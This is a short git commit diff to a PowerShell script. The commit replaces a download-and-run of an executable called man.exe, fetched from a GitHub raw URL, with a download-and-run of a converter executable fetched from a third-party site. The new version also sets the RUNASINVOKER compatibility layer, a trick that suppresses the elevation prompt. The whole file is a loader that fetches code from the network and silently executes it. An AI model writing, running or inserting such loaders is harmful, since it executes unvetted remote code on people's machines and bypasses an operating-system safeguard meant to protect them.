1deed815c22fc69e2e46ccaa176d864e84948b07
IncsecRishie <155700814+IncsecRishie@users.noreply.github.com>
2024-05-31 13:37:51 +1000

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -1,3 +1,8 @@
-# Download and execute the executable file
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/IncsecRishie/wdwddwdw/main/man.exe" -OutFile "$env:TEMP\man.exe"
-Start-Process "$env:TEMP\man.exe"
+# Download the executable file
+Invoke-WebRequest -Uri "https://www.battoexeconverter.com/downloads/advbattoexeconverter.exe" -OutFile "$env:TEMP\advbattoexeconverter.exe"
+
+# Set the compatibility layer
+$env:__COMPAT_LAYER = "RUNASINVOKER"
+
+# Execute the downloaded executable file
+Start-Process "$env:TEMP\advbattoexeconverter.exe"
